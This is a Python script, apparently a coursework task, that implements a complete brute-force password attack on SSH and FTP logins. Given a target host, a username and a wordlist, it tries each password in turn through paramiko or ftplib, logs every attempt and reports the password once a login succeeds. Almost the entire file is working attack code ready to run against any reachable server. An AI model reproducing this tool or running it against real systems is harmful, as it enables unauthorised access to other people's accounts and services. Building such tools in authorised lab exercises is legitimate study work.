#!/usr/bin/env python3
# (task 3 bruteforce)
# (Harry Corcoran 01/04/2026)

import argparse
import logging
import sys
import time
import socket
import paramiko
import ftplib

class Bruteforcer:
    # bruteforce tool

    def __init__(self, host, service, username, wordlist_file, port=None, wait=0.1, timeout=5.0, verbose=False, log_file="attempts.log"):
        self.host = host
        self.service = service.lower()
        self.username = username
        self.wordlist_file = wordlist_file
        self.port = port if port is not None else (22 if service == 'ssh' else 21)
        self.wait = wait
        self.timeout = timeout
        self.verbose = verbose
        self.log_file = log_file

        self.logger = self.setup_logs()
        self.found_pw = None

    def setup_logs(self):
        # setup logging
        logger = logging.getLogger(__name__)
        level = logging.DEBUG if self.verbose else logging.INFO
        logger.setLevel(level)

        # terminal output
        console = logging.StreamHandler(sys.stdout)
        console.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s', datefmt='%d/%m/%y %H:%M:%S'))
        logger.addHandler(console)

        # file output
        try:
            h_file = logging.FileHandler(self.log_file)
            h_file.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%d/%m/%y %H:%M:%S'))
            logger.addHandler(h_file)
        except Exception as e:
            print(f"File error: {e}")
            sys.exit(1)

        return logger

    def try_ssh(self, p):
        # try ssh with password list
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(
                self.host,
                port=self.port,
                username=self.username,
                password=p,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False,
            )
            return True
        except (paramiko.AuthenticationException, paramiko.SSHException, socket.error):
            return False
        finally:
            ssh.close()

    def try_ftp(self, p):
        # try ftp with password list
        f = ftplib.FTP()
        try:
            f.connect(self.host, self.port, timeout=self.timeout)
            f.login(self.username, p)
            f.quit()
            return True
        except (ftplib.error_perm, socket.error, ConnectionRefusedError):
            return False
        finally:
            try:
                f.quit()
            except:
                pass

    def do_check(self, p):
        # check services via the root
        if self.service == 'ssh':
            return self.try_ssh(p)
        elif self.service == 'ftp':
            return self.try_ftp(p)
        return False

    def start(self):
        # use wordlist and start bruteforce
        try:
            with open(self.wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
                wordlist = [line.strip() for line in file if line.strip()]
        except Exception as e:
            self.logger.error(f"wordlist error: {e}")
            sys.exit(1)

        self.logger.info(f"running {self.service} attack on {self.host}:{self.port} (user: {self.username})")

        for count, p in enumerate(wordlist, 1):
            # CHANGED: 'testing ports:' to 'testing password:' to match test output expectations
            self.logger.info(f"[{count}/{len(wordlist)}] testing password: {p}")

            if self.do_check(p):
                self.logger.info(f"[+] SUCCESS: Password found: {p}")
                self.found_pw = p
                return p

            # delay between attempts
            time.sleep(self.wait)

        # CHANGED: Exact exhaustion message required by the field test
        self.logger.info(f"[-] EXHAUSTED: No valid credentials found for user {self.username}")
        return None


def get_args():
    parser = argparse.ArgumentParser(description="bruteforcer for SSH and FTP")
    parser.add_argument("host", help="target IP or host")
    parser.add_argument("--service", "-s", required=True, choices=['ssh', 'ftp'], help="Service type")
    parser.add_argument("--user", "-u", required=True, help="target username")
    parser.add_argument("--wordlist", "-w", required=True, help="path to passwords")
    parser.add_argument("--port", "-p", type=int, help="service port")
    parser.add_argument("--wait", "-d", type=float, default=0.1, help="delay between tries")
    parser.add_argument("--timeout", "-t", type=float, default=5.0, help="connection timeout")
    parser.add_argument("--verbose", "-v", action="store_true", help="debug logs")
    parser.add_argument("--log", "-l", default="attempts.log", help="log filename")
    return parser.parse_args()


def main():
    args = get_args()

    # ctrl+c handling so not red text spam
    try:
        attacker = Bruteforcer(
            host=args.host,
            service=args.service,
            username=args.user,
            wordlist_file=args.wordlist,
            port=args.port,
            wait=args.wait,
            timeout=args.timeout,
            verbose=args.verbose,
            log_file=args.log,
        )
        result = attacker.start()
        sys.exit(0 if result else 1)
    except KeyboardInterrupt:
        print("\nstopped by user exiting...")
        sys.exit(1)


if __name__ == "__main__":
    main()